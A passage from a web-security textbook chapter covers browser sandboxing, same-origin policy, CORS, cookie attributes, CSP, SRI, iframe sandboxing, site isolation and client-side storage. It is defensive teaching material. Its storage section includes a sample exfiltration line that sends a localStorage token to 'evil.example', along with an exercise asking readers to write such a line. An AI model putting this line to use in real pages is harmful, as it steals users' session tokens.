- The sandbox denies a renderer direct disk, network, and process access; it may only make validated IPC requests to the browser process.
- Compromising a renderer is not enough — an attacker needs a second "sandbox escape" bug, which is why real attacks are multi-bug chains.
- Keeping the browser patched breaks exploit chains, because each fix removes a link the whole chain relied on.

> 🧪 Practice
>
> 1. Open your browser's task manager and identify how many separate processes a few open tabs consume; note whether same-site tabs share a process.
> 2. Explain in one paragraph why a bug in the JavaScript engine alone usually cannot steal a file from disk.
> 3. Describe the role of IPC between renderer and browser process, and why it must validate every message.
> 4. *Interview-style:* "Why do browser vendors describe serious exploits as 'chains' rather than single vulnerabilities?" *Hint: think about how many independent security boundaries a payload must cross to go from a web page to your filesystem.*

#### DOM, JavaScript Execution, and Event Model

**Theory**

When a browser parses HTML, it does not keep the raw text; it builds a live, in-memory tree called the **Document Object Model (DOM)**. Each tag becomes a node, nesting becomes parent/child relationships, and JavaScript manipulates this tree through APIs like `document.getElementById` or `element.innerHTML`. The crucial security insight is that *the DOM, not the HTML source, is what actually renders and runs*. Two different byte streams can produce the same DOM, and one innocuous-looking string can produce an executable `<script>` node once the parser gets hold of it — which is the entire basis of XSS.

JavaScript runs on a **single thread** driven by an **event loop**. Code does not run continuously; it runs in response to **events** — a page load, a click, a timer firing, a network response arriving. When an event occurs, its registered handler is placed on a queue and executed to completion before the next one begins. Events also **propagate** through the DOM tree in two phases: **capturing** (root down to the target) and **bubbling** (target back up to the root). This propagation is why a single click listener on a parent element can handle clicks on any child, and it is also why an attacker who controls a child node can influence handlers defined higher up.

Understanding the DOM-versus-source distinction and the event model is a prerequisite for everything in this chapter: DOM-based XSS lives entirely in how scripts read and write the tree, clickjacking abuses where events land, and prototype pollution corrupts the objects these scripts rely on.

**Examples**

```html
<!-- Source HTML the server sent -->
<ul id="list"><li>first</li></ul>
<script>
  const ul = document.getElementById('list');      // find the node in the DOM tree
  const li = document.createElement('li');          // create a new element node
  li.textContent = 'second (safe: text, not HTML)'; // textContent never parses markup
  ul.appendChild(li);                               // attach it; the DOM updates live

  // Event delegation: one listener on the parent handles clicks on any <li> child.
  ul.addEventListener('click', (e) => {
    console.log('clicked:', e.target.textContent);  // e.target is the actual <li> hit
  });
</script>
```

```text
Event flow for a click on the inner <li>:

  document ──(1) CAPTURING──▶ <ul> ──▶ <li>   [target]
  document ◀──(2) BUBBLING──  <ul> ◀──  <li>
  A listener on <ul> fires during bubbling even though <li> was clicked.
```

**Key Takeaways**

- The browser renders and executes the DOM tree, not the original HTML text; equivalent DOMs can come from very different source strings.
- Assigning `textContent` inserts text safely, while `innerHTML` parses the string as markup and can create executable nodes.
- JavaScript is single-threaded and event-driven: handlers run to completion in response to queued events.
- Events capture down then bubble up the tree, enabling delegation — and giving attacker-controlled child nodes influence over ancestor handlers.

> 🧪 Practice
>
> 1. Write a snippet that adds a list item two ways — with `textContent` and with `innerHTML` — and explain which is safe for untrusted data and why.
> 2. Attach a click listener to a parent element and log which child was actually clicked using `event.target`.
> 3. Draw the capturing and bubbling phases for a click on a deeply nested element.
> 4. *Interview-style:* "Why can two different HTML strings be 'the same page' from a security standpoint?" *Hint: the parser normalizes both into one DOM, so defenses that inspect the raw string can miss what actually gets built.*

#### Same-Origin Policy and Origin Definition

**Theory**

The **same-origin policy (SOP)** is the foundational rule of web security: script running in one origin may not read data from another origin. Without it, a page you opened from `evil.example` could silently read your webmail, your bank balance, and your internal corporate apps, because your browser attaches your cookies to those sites automatically. The SOP is the fence that keeps every site in its own yard.

An **origin** is the triple of **scheme, host, and port** — for example `https://app.example:443`. All three must match for two pages to share an origin. `https://app.example` and `http://app.example` differ (scheme); `https://app.example` and `https://api.example` differ (host); `https://app.example:443` and `https://app.example:8443` differ (port). A common point of confusion is that the *path* is irrelevant to origin, while the *subdomain* is significant: `a.example` and `b.example` are different origins even though they share a parent domain.

The SOP is nuanced in practice because it restricts *reading*, not *sending*. Your browser will happily send a cross-origin request (loading an image, submitting a form, embedding a script) — it just won't let the initiating page read the cross-origin *response* unless the other side opts in via CORS. This asymmetry is deliberate and it is exactly what makes CSRF possible (the request is sent with your cookies) while still preventing data theft (the response can't be read). Keeping "send versus read" straight is the key to reasoning about almost every attack in this chapter.

**Examples**

```text
Base origin:  https://app.example:443/dashboard

URL                               Same origin?  Why
https://app.example:443/settings   YES          path is irrelevant
http://app.example/dashboard       NO           scheme differs (http vs https)
https://app.example:8443/          NO           port differs
https://api.example/dashboard      NO           host differs
https://sub.app.example/           NO           subdomain = different host
```

```javascript
// Allowed: SEND a cross-origin request (no cookies-based read of the response).
fetch('https://api.other.example/data')   // request goes out...
  .then(r => r.text())                     // ...but this READ is blocked by SOP
  .catch(() => console.log('blocked by same-origin policy unless CORS allows it'));

// Always allowed: embedding cross-origin resources (sent, but not readable as data).
// <img src="https://other.example/pic.png">   loads and renders, script can't read pixels
```

**Key Takeaways**

- The same-origin policy stops script in one origin from reading data belonging to another origin.
- An origin is scheme + host + port; all three must match, while the path does not matter and subdomains count as different hosts.
- The SOP restricts reading responses, not sending requests — cross-origin requests still go out with your cookies.
- That "send but not read" asymmetry is simultaneously what enables CSRF and what prevents cross-origin data theft.

> 🧪 Practice
>
> 1. Given `https://shop.example:443`, classify five URLs as same-origin or not and justify each.
> 2. Explain why `http://` and `https://` versions of the same host are different origins and what attack this prevents.
> 3. Describe one thing the SOP allows cross-origin and one thing it forbids, and connect each to a real attack or defense.
> 4. *Interview-style:* "If the SOP blocks reading cross-origin responses, how can CSRF do damage at all?" *Hint: the attack never needs to read the response — it only needs the authenticated request to be sent.*

#### Cross-Origin Resource Sharing (CORS)

**Theory**

The same-origin policy is deliberately strict, but modern apps legitimately need to call APIs on other origins — a front-end at `app.example` talking to an API at `api.example`. **Cross-Origin Resource Sharing (CORS)** is the controlled, opt-in mechanism that lets a server say "it is safe for *these* other origins to read my responses." Crucially, CORS is a *relaxation* of the SOP decided by the **responding server**, communicated through response headers, and enforced by the **browser**. It is not a server-side access control; it does not stop anyone from *sending* a request, it only governs whether the browser will let the calling script *read* the response.

For "simple" requests the browser sends the request and then checks the `Access-Control-Allow-Origin` header on the response; if it doesn't list the caller's origin, the browser throws away the response. For requests that could have side effects or carry unusual headers, the browser first sends a **preflight** `OPTIONS` request asking permission, and only proceeds if the server approves the method and headers. When credentials (cookies) are involved, the rules tighten: the server must send `Access-Control-Allow-Credentials: true` and must *not* use the wildcard `*` for the origin.

CORS is one of the most misconfigured features on the web. The classic disaster is reflecting the request's `Origin` header back into `Access-Control-Allow-Origin` while also allowing credentials — this effectively allows *every* origin to read authenticated responses, turning the SOP off for your most sensitive data. A safe CORS policy allows a short, explicit allowlist of origins, never reflects arbitrary origins, and pairs credentialed access with careful review.

**Examples**

```http
# Browser sends a credentialed cross-origin request; it includes the Origin header:
GET /account HTTP/1.1
Host: api.example
Origin: https://app.example
Cookie: session=...

# SAFE response: explicit origin + credentials allowed (never "*" with credentials).
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.example
Access-Control-Allow-Credentials: true
```

```text
DANGEROUS misconfiguration (do NOT do this):
  Access-Control-Allow-Origin: <reflects whatever Origin was sent>
  Access-Control-Allow-Credentials: true
  => any attacker site can read the victim's authenticated responses.

Preflight for a non-simple request:
  Browser --> OPTIONS /account   (Access-Control-Request-Method: PUT)
  Server  --> 204  Access-Control-Allow-Methods: PUT
  Browser --> only now sends the real PUT request
```

**Key Takeaways**

- CORS is a server-granted, browser-enforced relaxation of the SOP that controls whether a calling script may *read* a cross-origin response.
- It does not block requests from being sent and is not a substitute for server-side authorization.
- Non-simple or credentialed requests trigger a preflight `OPTIONS` check that the server must approve.
- Reflecting arbitrary origins while allowing credentials is a critical misconfiguration — use an explicit allowlist and never pair `*` with credentials.

> 🧪 Practice
>
> 1. Write the response headers for an API that should allow only `https://app.example` to make credentialed reads.
> 2. Explain the difference between a "simple" request and one that triggers a preflight, with an example of each.
> 3. Describe exactly why `Access-Control-Allow-Origin: *` together with `Access-Control-Allow-Credentials: true` is rejected by browsers.
> 4. *Interview-style:* "A pentester reports that an API reflects the `Origin` header and allows credentials. Why is this critical?" *Hint: ask what prevents `evil.example` from scripting an authenticated read of a logged-in victim's data.*

#### Cookie Attributes: HttpOnly, Secure, SameSite

**Theory**

A session cookie is a **bearer token** — whoever presents it is treated as the user — so the attributes that govern how it is stored and sent are among the most important security controls in a web app. Three attributes do the heavy lifting. **`HttpOnly`** hides the cookie from JavaScript (`document.cookie` can't see it), so even if an attacker achieves XSS, they cannot simply read and exfiltrate the session cookie. **`Secure`** forbids the browser from ever sending the cookie over plain HTTP, preventing it from leaking to a network eavesdropper on an accidental `http://` link.

**`SameSite`** is the structural defense against CSRF. It tells the browser whether to attach the cookie to requests that originate from *other* sites. `SameSite=Strict` never sends the cookie on any cross-site request (strongest, but breaks following links into your logged-in site). `SameSite=Lax` (the modern default in major browsers) sends it only on top-level navigations using safe methods like clicking a link, but not on cross-site `POST`s or background requests — which blocks the most common CSRF shapes. `SameSite=None` sends it on all cross-site requests and *must* be paired with `Secure`; it is required for legitimate cross-site cookies but reopens the CSRF door, so it demands additional protection.

The mental model: `HttpOnly` limits the damage of XSS, `Secure` limits the damage of network exposure, and `SameSite` limits the damage of cross-site request forgery. They are independent and should generally all be set on session cookies. Relying on browser defaults is risky because defaults vary and change over time; set them explicitly.

**Examples**

```http
# A well-configured session cookie sets all three protective attributes:
Set-Cookie: session=9f8a...e1; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
#            └ value        └ hidden from JS
#                                     └ HTTPS only
#                                              └ not sent on cross-site POST (CSRF defense)
```

| Attribute | Attack it blunts | Effect |
|-----------|------------------|--------|
| `HttpOnly` | XSS cookie theft | JavaScript cannot read the cookie |
| `Secure` | Network sniffing | Cookie sent only over HTTPS |
| `SameSite=Lax/Strict` | CSRF | Cookie withheld on cross-site requests |
| `SameSite=None` | (enables cross-site use) | Must be `Secure`; needs extra CSRF defense |

```javascript
// With HttpOnly set, an XSS payload still cannot read the session cookie:
console.log(document.cookie);   // session cookie is simply absent from this string
```

**Key Takeaways**

- A session cookie is a bearer token, so its attributes are core security controls, not optional tuning.
- `HttpOnly` blocks JavaScript (and thus XSS) from reading the cookie; `Secure` blocks it from traveling over plain HTTP.
- `SameSite` controls cross-site sending: `Lax` (default) stops most CSRF, `Strict` is stronger but breaks inbound links, `None` must be `Secure` and needs extra CSRF defense.
- Set these attributes explicitly on every session cookie rather than trusting browser defaults.

> 🧪 Practice
>
> 1. Write a `Set-Cookie` header for a session that resists XSS theft, plaintext leakage, and basic CSRF.
> 2. Explain the behavioral difference between `SameSite=Strict` and `SameSite=Lax` with a concrete user action for each.
> 3. Describe a legitimate case that needs `SameSite=None` and what extra defense you would add.
> 4. *Interview-style:* "Does `HttpOnly` prevent XSS?" *Hint: distinguish stopping the vulnerability from limiting one specific consequence of it.*

#### Cookie Scoping, Domains, and Paths

**Theory**

Beyond the protective flags, cookies have **scoping** attributes that decide *which requests* carry them — and getting scope wrong can expose a cookie far more widely than intended. The **`Domain`** attribute controls the host scope. If you omit it, the cookie is **host-only**: sent only to the exact host that set it. If you set `Domain=example.com`, the cookie becomes valid for `example.com` *and all its subdomains* (`app.example.com`, `blog.example.com`, and so on). This is the opposite of most people's intuition — specifying a domain *broadens* rather than narrows the scope.

The **`Path`** attribute scopes by URL path: `Path=/admin` means the cookie is sent only for requests under `/admin`. Importantly, path scoping is *not* a real security boundary, because same-origin pages can read each other's DOM regardless of path, so a script at `/public` can often reach cookies set at `/admin` within the same origin. Path should be treated as a routing convenience, not isolation.

The dangerous pattern is **overly broad domain scope** on a shared parent domain. If sensitive apps live on sibling subdomains (`bank.example.com`, `blog.example.com`) and a session cookie is scoped to `.example.com`, then a vulnerability on the low-value `blog` subdomain can leak or set the high-value `bank` session cookie — a "cookie tossing" or subdomain-takeover risk. The defense is to scope cookies as narrowly as possible (host-only by default) and to use the **`__Host-` prefix**, which the browser enforces to mean "host-only, `Secure`, `Path=/`, no `Domain`," guaranteeing the cookie can't be scoped broadly or set by a subdomain.

**Examples**

```http
# Host-only (safest default): sent ONLY to exactly app.example.com
Set-Cookie: sid=abc; Secure; HttpOnly; SameSite=Lax; Path=/

# Broadened to all subdomains — sent to app., blog., anything under example.com
Set-Cookie: sid=abc; Domain=example.com; Secure; HttpOnly

# Hardened with a browser-enforced prefix: must be host-only, Secure, Path=/
Set-Cookie: __Host-sid=abc; Secure; HttpOnly; SameSite=Lax; Path=/
```

```text
Domain scoping is counterintuitive:
  (no Domain attr)        -> host-only: app.example.com ONLY
  Domain=example.com      -> app.example.com, blog.example.com, *.example.com

Risk: blog.example.com is compromised and the session cookie is .example.com-scoped
  => the attacker can read/overwrite the cookie that bank.example.com relies on.
```

**Key Takeaways**

- Omitting `Domain` makes a cookie host-only (narrowest); setting `Domain=example.com` broadens it to every subdomain.
- `Path` is a routing convenience, not a security boundary — same-origin script can usually reach cookies across paths.
- Broad domain scope on a shared parent lets a weak subdomain compromise a strong one (cookie tossing / subdomain takeover).
- Prefer host-only cookies and the `__Host-` prefix, which the browser enforces to prevent broad or subdomain-set scoping.

> 🧪 Practice
>
> 1. Explain why `Domain=example.com` is broader, not narrower, than omitting the `Domain` attribute.
> 2. Describe a scenario where a vulnerable subdomain compromises a sensitive sibling via cookie scope, and how `__Host-` prevents it.
> 3. State why `Path` should not be relied on to isolate cookies between two sections of the same origin.
> 4. *Interview-style:* "When would you choose the `__Host-` prefix over just setting `Secure` and `HttpOnly`?" *Hint: think about guarantees the browser enforces versus attributes a developer merely hopes are set correctly.*

#### Content Security Policy Directives

**Theory**

If the same-origin policy is the fence between sites, **Content Security Policy (CSP)** is a fence a site builds *around itself* to limit the damage of a successful injection. It is an HTTP response header (or `<meta>` tag) that tells the browser, in fine detail, which sources of script, style, images, frames, and connections are allowed to load and execute. The core idea is **defense in depth**: even if an attacker manages to inject markup, a good CSP can prevent that markup from actually running a script or exfiltrating data, turning a critical XSS into a non-event.

CSP works through **directives**, each governing a resource type. `script-src` is the most important — it controls where scripts may come from. `default-src` is the fallback for directives you don't specify. `img-src`, `style-src`, `connect-src` (for `fetch`/XHR/WebSocket), `frame-src`, and `frame-ancestors` (who may frame *you*, a clickjacking defense) round out the common set. The classic weak policy allows `'unsafe-inline'`, which permits inline `<script>` blocks and defeats CSP's main benefit. The robust approach uses a per-response random **nonce** (`script-src 'nonce-RANDOM'`) or a **hash** so only the site's own, explicitly-marked scripts run, plus `'strict-dynamic'` to let those trusted scripts load their dependencies.

CSP is powerful but fiddly: it is easy to write a policy that looks strict but contains a bypass (an allowlisted CDN that hosts a vulnerable library, a reachable JSONP endpoint, or `'unsafe-eval'`). It is best deployed incrementally using `Content-Security-Policy-Report-Only`, which reports violations without blocking, so you can tighten the policy against real traffic before enforcing it.

**Examples**

```http
# Strong, nonce-based policy: only scripts carrying this request's nonce execute.
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-r4nd0m2024' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
  frame-ancestors 'none';            # also prevents this page being framed (clickjacking)
```

```html
<!-- Only a script tagged with the matching nonce runs under the policy above -->
<script nonce="r4nd0m2024">initApp();</script>   <!-- runs -->
<script>stealCookies();</script>                  <!-- blocked: no nonce -->
<img src="x" onerror="alert(1)">                  <!-- blocked: inline handler -->
```

| Directive | Governs | Common hardening |
|-----------|---------|------------------|
| `script-src` | Where scripts load/run | Nonces/hashes, avoid `'unsafe-inline'` |
| `default-src` | Fallback for unset types | Set to `'self'` or `'none'` |
| `connect-src` | fetch/XHR/WebSocket targets | Restrict exfiltration endpoints |
| `frame-ancestors` | Who may frame this page | `'none'` or trusted origins (anti-clickjacking) |
| `object-src` | Plugins/embeds | `'none'` |

**Key Takeaways**

- CSP is a site-defined, browser-enforced allowlist that limits where scripts and other resources may load, providing defense in depth against XSS.
- `script-src` is the key directive; `'unsafe-inline'` largely defeats CSP, while per-response nonces or hashes plus `'strict-dynamic'` are the robust pattern.
- `frame-ancestors` doubles as a clickjacking defense by controlling who can embed the page.
- Roll CSP out with `Report-Only` first, and watch for bypasses via allowlisted-but-vulnerable hosts, JSONP, or `'unsafe-eval'`.

> 🧪 Practice
>
> 1. Write a CSP that permits only the site's own scripts (via nonce) and blocks inline event handlers and plugins.
> 2. Explain why `'unsafe-inline'` in `script-src` undermines most of CSP's value.
> 3. Describe how you would deploy a new CSP to a live site without breaking it.
> 4. *Interview-style:* "An app has a strict CSP but still suffers XSS. Name two ways a policy can be bypassed." *Hint: think about trusted-but-dangerous hosts on the allowlist and script-gadget endpoints like JSONP.*

#### Subresource Integrity

**Theory**

Websites routinely load scripts and stylesheets from third-party servers — a CDN hosting jQuery, an analytics vendor, a font provider. This is convenient but creates a trust problem: you are executing whatever bytes that third party serves, and if the CDN is compromised or the vendor turns malicious, your users run their code with full access to your page. **Subresource Integrity (SRI)** solves this by letting you pin the *exact content* you expect. You compute a cryptographic hash of the known-good file and put it in an `integrity` attribute; the browser downloads the resource, hashes it, and refuses to execute it if the hash does not match.

The analogy is a tamper-evident seal on a shipment: you don't have to trust the courier, because you can verify the seal matches what the sender told you to expect. If anyone altered the file in transit or at the source, the hash diverges and the browser blocks it. This converts a "trust the CDN forever" relationship into "trust this exact version," which is a dramatically smaller attack surface.

SRI has limits worth understanding. It only works for resources whose content you can pin — it is unsuitable for endpoints that legitimately change on every request (like many analytics or ad scripts), which is one reason supply-chain attacks via such scripts remain hard to fully prevent. It is typically paired with `crossorigin="anonymous"` so the browser can read the response for hashing, and it should be combined with CSP's `require-sri-for` style controls where supported. SRI protects integrity, not confidentiality, and does not help if the *legitimate* pinned version is itself malicious.

**Examples**

```html
<!-- Pin an exact version of a CDN script by its SHA-384 hash. -->
<script
  src="https://cdn.example/lib@1.2.3/lib.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
  crossorigin="anonymous">     <!-- lets the browser fetch+hash the cross-origin file -->
</script>
<!-- If the CDN serves even one changed byte, the hash mismatches and the browser
     refuses to run the script, neutralizing a CDN-compromise supply-chain attack. -->
```

```bash
# Generate the integrity value for a file you control/trust:
cat lib.min.js | openssl dgst -sha384 -binary | openssl base64 -A
# Prefix the output with "sha384-" and paste into the integrity attribute.
```

**Key Takeaways**

- SRI pins a third-party resource to a cryptographic hash, so the browser refuses to run it if the bytes differ from what you expect.
- It converts open-ended "trust the CDN" into "trust this exact version," shrinking supply-chain risk.
- Use `crossorigin="anonymous"` with cross-origin SRI, and prefer SHA-384/512 hashes.
- SRI cannot protect resources that legitimately change each load, and does not help if the pinned version is itself malicious.

> 🧪 Practice
>
> 1. Generate an SRI hash for a local JavaScript file and add the correct `integrity` and `crossorigin` attributes to a script tag.
> 2. Explain what the browser does, step by step, when an SRI-protected file's hash does not match.
> 3. Describe one category of third-party script for which SRI is impractical and why.
> 4. *Interview-style:* "How does SRI defend against a compromised CDN, and what attack does it *not* defend against?" *Hint: it verifies content equals the pinned version — think about what happens if that very version is backdoored at the source before you pin it.*

#### iframe Sandboxing and X-Frame-Options

**Theory**

An `<iframe>` embeds one page inside another, and by default the embedded page runs with its normal capabilities. Two separate concerns arise. First, *you* may want to embed *untrusted* content (an ad, a user-submitted widget) while stripping its dangerous powers — that is what the **`sandbox`** attribute does. Second, *others* may want to embed *your* page to trick your users (clickjacking) — and you defend against that with **`X-Frame-Options`** or, better, CSP's **`frame-ancestors`**.

The `sandbox` attribute applies a restrictive default to the framed content: with a bare `<iframe sandbox>` the content cannot run scripts, submit forms, access its parent, use plugins, or be treated as its own origin. You then *selectively* re-grant capabilities with tokens like `allow-scripts`, `allow-forms`, or `allow-same-origin`. A critical footgun: combining `allow-scripts` and `allow-same-origin` on content from your own origin lets the framed page script its way out of the sandbox entirely, so those two together are effectively no sandbox at all for same-origin content.

On the defensive side, `X-Frame-Options: DENY` forbids your page from being framed anywhere, and `SAMEORIGIN` permits only same-origin framing — the classic clickjacking defense. The modern replacement is `Content-Security-Policy: frame-ancestors 'none'` (or an explicit origin list), which is more expressive and supports multiple allowed framers. Pages that handle sensitive actions (transfers, permission grants, admin operations) should set one of these so an attacker cannot invisibly overlay them under a decoy UI.

**Examples**

```html
<!-- Embed untrusted content with almost no powers, re-granting only scripting. -->
<iframe src="https://widget.vendor.example/w"
        sandbox="allow-scripts">            <!-- NO allow-same-origin: stays isolated -->
</iframe>

<!-- DANGEROUS for same-origin content: these two together defeat the sandbox. -->
<iframe src="/my/widget" sandbox="allow-scripts allow-same-origin"></iframe>
```

```http
# Defend YOUR page from being framed by others (clickjacking):
X-Frame-Options: DENY
# Modern, preferred equivalent (and more flexible):
Content-Security-Policy: frame-ancestors 'none'
```

| Goal | Mechanism |
|------|-----------|
| Neuter untrusted embedded content | `<iframe sandbox="...">`, re-grant minimally |
| Stop others framing your page | `X-Frame-Options` or `frame-ancestors` |
| Allow only same-origin framing | `X-Frame-Options: SAMEORIGIN` / `frame-ancestors 'self'` |

**Key Takeaways**

- `sandbox` applies a deny-by-default policy to framed content; you re-grant capabilities explicitly with `allow-*` tokens.
- Combining `allow-scripts` with `allow-same-origin` on same-origin content lets the frame escape the sandbox — avoid it.
- `X-Frame-Options` (`DENY`/`SAMEORIGIN`) and CSP `frame-ancestors` control who may frame *your* page, defeating clickjacking.
- Sensitive, state-changing pages should always restrict who can frame them.

> 🧪 Practice
>
> 1. Write an `<iframe>` tag that embeds a third-party widget which may run scripts but cannot access its parent or act as your origin.
> 2. Explain why `allow-scripts allow-same-origin` together can nullify the sandbox for same-origin content.
> 3. Compare `X-Frame-Options` and `frame-ancestors` and state when you would prefer the latter.
> 4. *Interview-style:* "Which header protects a page from being clickjacked, and why is the CSP version preferred?" *Hint: think about supporting multiple allowed framing origins, which the older header cannot express.*

#### Referrer Policy and Permissions Policy

**Theory**

Two response-controlled policies let a site limit information leakage and feature abuse. **Referrer Policy** governs the `Referer` header — the URL the browser automatically attaches to outgoing requests to say "I came from here." That header is useful for analytics but routinely leaks sensitive data: full URLs often contain session tokens, password-reset tokens, internal hostnames, or search queries, and by default these can leak to third-party sites you link to or load resources from. `Referrer-Policy` lets you cut this down — for example `strict-origin-when-cross-origin` (a sensible default) sends the full URL to same-origin destinations but only the bare origin cross-origin, and `no-referrer` sends nothing at all.

**Permissions Policy** (formerly "Feature Policy") controls which powerful browser **features** a page — and the frames it embeds — may use: camera, microphone, geolocation, fullscreen, autoplay, payment, and more. The point is least privilege for capabilities: if your page never needs the camera, you can disable it outright, so that even a successful injection or a malicious embedded iframe cannot prompt the user for camera access. It is delivered via the `Permissions-Policy` response header with per-feature allowlists, and it can delegate or deny features to iframes specifically, which is important when embedding third-party content.

Together these policies reduce two different risks: Referrer Policy reduces *data exfiltration through a side channel you forgot about*, and Permissions Policy reduces *capability abuse* by your own compromised page or by the content you embed. Both are cheap to set and are part of a well-hardened response-header baseline.

**Examples**

```http
# Don't leak full URLs (which may carry tokens) to other origins:
Referrer-Policy: strict-origin-when-cross-origin
#   same-origin request  -> full URL in Referer
#   cross-origin request -> only "https://app.example" (no path/query)

# Disable powerful features the app doesn't need; deny camera entirely, geo to self only:
Permissions-Policy: camera=(), microphone=(), geolocation=(self), payment=()
```

```text
Why Referrer Policy matters:
  Page URL: https://app.example/reset?token=SECRET123
  User clicks a link to https://analytics.thirdparty.example
  Default-ish behavior could send Referer: https://app.example/reset?token=SECRET123
  strict-origin-when-cross-origin sends only: https://app.example
```

**Key Takeaways**

- `Referrer-Policy` controls how much of the originating URL leaks in the `Referer` header; full URLs can contain tokens and secrets.
- `strict-origin-when-cross-origin` is a strong default; `no-referrer` sends nothing when maximum privacy is needed.
- `Permissions-Policy` enforces least privilege on powerful features (camera, mic, geolocation, payment) for the page and its iframes.
- Both are low-cost response headers that shrink side-channel leakage and capability abuse.

> 🧪 Practice
>
> 1. Set a `Referrer-Policy` that keeps full URLs internal but reveals only the origin to third parties, and explain each behavior.
> 2. Give a concrete example of a secret leaking via the `Referer` header and how a policy prevents it.
> 3. Write a `Permissions-Policy` that disables the microphone and camera but allows geolocation for the site itself.
> 4. *Interview-style:* "Why might a password-reset page specifically want `Referrer-Policy: no-referrer`?" *Hint: consider what is in the URL and where the user might click next.*

#### Site Isolation and Cross-Origin Isolation Headers

**Theory**

Transient-execution attacks like **Spectre** showed that a renderer process could, in principle, read any data that happens to share its address space — defeating software checks like the same-origin policy at the hardware level. The architectural response is **Site Isolation**: the browser guarantees that documents from different *sites* live in different OS processes, so one site's data is simply never in the same memory as another's, and a Spectre-style read has nothing cross-origin to steal. Site Isolation is now on by default in major browsers and is why the renderer process model from earlier in this section is organized by site.

Some powerful features — high-resolution timers, `SharedArrayBuffer` — were restricted after Spectre because they make such attacks easier. To use them again, a page must prove it is in a clean, **cross-origin isolated** context by sending two headers. **`Cross-Origin-Opener-Policy: same-origin` (COOP)** severs the scripting relationship with cross-origin windows that opened or were opened by the page, and **`Cross-Origin-Embedder-Policy: require-corp` (COEP)** requires every subresource to explicitly opt into being embedded. When both are present, the browser places the page in its own isolated process group and re-enables the gated features.

Related opt-in headers let individual resources state who may load them: **Cross-Origin-Resource-Policy (CORP)** lets a response say "only same-origin/same-site/cross-origin may embed me," defending against speculative cross-origin reads of your resources. The practical takeaway for an application developer: you get Site Isolation for free, but if you need the powerful isolated features, you must deliberately adopt COOP+COEP, and you should set CORP on sensitive endpoints to limit who can pull them into another page.

**Examples**

```http
# Opt into a cross-origin isolated context (re-enables SharedArrayBuffer, precise timers):
Cross-Origin-Opener-Policy: same-origin        # cut ties with cross-origin windows
Cross-Origin-Embedder-Policy: require-corp      # every subresource must opt in

# Protect a sensitive resource from being pulled into other sites:
Cross-Origin-Resource-Policy: same-origin
```

```javascript
// You can check at runtime whether the isolation (and gated APIs) is active:
if (self.crossOriginIsolated) {
  const buf = new SharedArrayBuffer(1024);   // allowed only in an isolated context
} else {
  console.log('Not cross-origin isolated: powerful timers/SAB are restricted');
}
```

**Key Takeaways**

- Site Isolation puts different sites in different processes so Spectre-style reads have no cross-origin data to steal; it is on by default.
- Powerful features gated after Spectre (precise timers, `SharedArrayBuffer`) require a cross-origin isolated context.
- That context is achieved by sending COOP `same-origin` and COEP `require-corp` together.
- CORP lets individual resources declare who may embed them, limiting speculative cross-origin reads.

> 🧪 Practice
>
> 1. Explain in plain terms how Site Isolation defends against a Spectre-style cross-origin read.
> 2. List the two headers required for cross-origin isolation and what each one does.
> 3. Describe a feature you cannot use without cross-origin isolation and how you would check for it in JavaScript.
> 4. *Interview-style:* "Why were high-resolution timers restricted after Spectre, and how does a page earn them back?" *Hint: timers help measure the microarchitectural side channel; the page must prove no cross-origin data shares its process.*

#### Local Storage, Session Storage, and IndexedDB Risks

**Theory**

Browsers offer several client-side storage mechanisms beyond cookies: **`localStorage`** (key-value strings, persists until explicitly cleared), **`sessionStorage`** (same API but cleared when the tab closes), and **`IndexedDB`** (a full asynchronous object database for larger structured data). They are convenient for caching, offline apps, and client state — but they carry security implications that developers frequently get wrong, especially around storing authentication material.

The cardinal rule: **do not store session tokens or other secrets in `localStorage`**. Unlike an `HttpOnly` cookie, anything in Web Storage is fully readable by JavaScript, which means a single XSS bug hands the attacker the token instantly — `localStorage.getItem('token')` and exfiltrate. Cookies with `HttpOnly` at least keep the token out of script's reach. People often move tokens to `localStorage` to "avoid CSRF," trading a well-mitigated risk (CSRF, which has strong structural defenses) for a worse one (total token theft on any XSS). All Web Storage is also origin-scoped but *not* path-scoped and persists across sessions (for `localStorage`), so it is a durable target.

There are further pitfalls: Web Storage is shared across all tabs and scripts on the origin, including any third-party script you include, so a compromised analytics library can read everything there. IndexedDB can hold large volumes of sensitive data (cached PII, draft documents) that lingers on shared machines. The guidance: keep secrets out of client storage, store only non-sensitive or already-public data, treat anything stored as readable by any script on the page, and clear sensitive caches on logout.

**Examples**

```javascript
// ANTI-PATTERN: a session token in localStorage is one XSS away from theft.
localStorage.setItem('auth_token', jwt);           // readable by ANY script on the origin
// An injected payload simply does:
fetch('https://evil.example/c?t=' + localStorage.getItem('auth_token'));  // exfiltrated

// BETTER: keep the token in an HttpOnly, Secure cookie the server sets; JS can't read it.
```

| Mechanism | Lifetime | Readable by JS? | Good for | Never store |
|-----------|----------|-----------------|----------|-------------|
| `localStorage` | Until cleared | Yes | UI prefs, non-secret cache | Tokens, secrets |
| `sessionStorage` | Until tab closes | Yes | Per-tab transient state | Tokens, secrets |
| `IndexedDB` | Until cleared | Yes | Large offline/structured data | Unencrypted PII/secrets |
| `HttpOnly` cookie | Server-controlled | **No** | Session tokens | (appropriate home for tokens) |

**Key Takeaways**

- All Web Storage (`localStorage`, `sessionStorage`, IndexedDB) is fully readable by any JavaScript on the origin, so XSS reads it instantly.
- Never store session tokens or secrets in Web Storage; prefer `HttpOnly` cookies that script cannot read.
- Moving tokens to `localStorage` to dodge CSRF trades a well-defended risk for a far worse XSS exposure.
- Treat anything stored client-side as visible to every script (including third-party libraries) and clear sensitive data on logout.

> 🧪 Practice
>
> 1. Explain why an `HttpOnly` cookie is safer than `localStorage` for a session token in the presence of XSS.
> 2. Write the one-line exfiltration an attacker would run if a JWT were kept in `localStorage`.
> 3. Argue for or against the common claim that `localStorage` tokens are "safer because they avoid CSRF."
> 4. *Interview-style:* "A team stores JWTs in `localStorage` citing CSRF concerns. What is your advice?" *Hint: weigh CSRF's strong structural defenses against the total token loss any XSS would cause.*

<a id="92-cross-site-scripting-xss"></a>
### 9.2 Cross-Site Scripting (XSS)

Cross-site scripting is the injection of attacker-controlled script into a page so that it runs in the victim's browser with the full authority of the vulnerable site. This section covers the three delivery mechanisms, how payloads are built and filters bypassed, what attackers do with the access, and the layered defenses that actually work.

#### Reflected XSS

